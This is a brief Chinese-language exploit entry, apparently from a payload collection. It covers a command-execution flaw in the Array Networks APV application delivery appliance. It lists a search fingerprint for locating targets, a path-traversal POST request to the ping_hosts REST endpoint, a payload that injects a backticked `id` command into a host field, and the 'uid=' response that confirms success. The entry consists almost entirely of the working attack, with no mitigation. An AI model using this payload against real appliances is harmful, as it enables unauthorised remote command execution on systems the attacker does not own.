# ArrayNetworksAPV应用交付系统RCE漏洞

ArrayNetworksAPV ｜ 命令执行 ｜ —
- **指纹**：`app="Array-APV"`
- **请求**：`POST /restapi/../rest/ping\_hosts HTTP/1.1`

**Payload**
```
\["127.0.0.1 echo `id` received 2 3 4"]=1\&csrfmiddlewaretoken=cXLnOdGshlksqOG0Ubnn4SlBvO8zOdWW
```
- **响应特征**：200 uid=